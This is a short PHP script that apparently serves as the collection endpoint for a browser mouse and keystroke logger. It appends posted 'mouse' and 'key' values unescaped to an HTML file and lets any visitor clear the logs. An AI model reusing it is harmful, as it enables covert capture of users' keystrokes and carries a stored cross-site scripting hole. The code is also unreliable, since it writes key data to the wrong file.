<?php
    $dv = "";
    if (isset($_GET['clear'])) {
        $fp = fopen('mouse.html' , 'w');
        fclose($fp);
        $fp = fopen('keyboard.html' , 'w');
        fclose($fp);
        echo 'true';
    }
    else{
        if (isset($_POST['mouse'])){
            $fp = fopen('mouse.html' , 'a');
            fwrite($fp, $_POST['mouse'].'<br>');
            fclose($fp);
            echo 'true';
        }
        if (isset($_POST['key'])){
            $fp = fopen('mouse.html' , 'a');
            fwrite($fp, $_POST['key']);
            fclose($fp);
            echo 'true';
        }
        else{
            echo 'false';
        }
    }
?>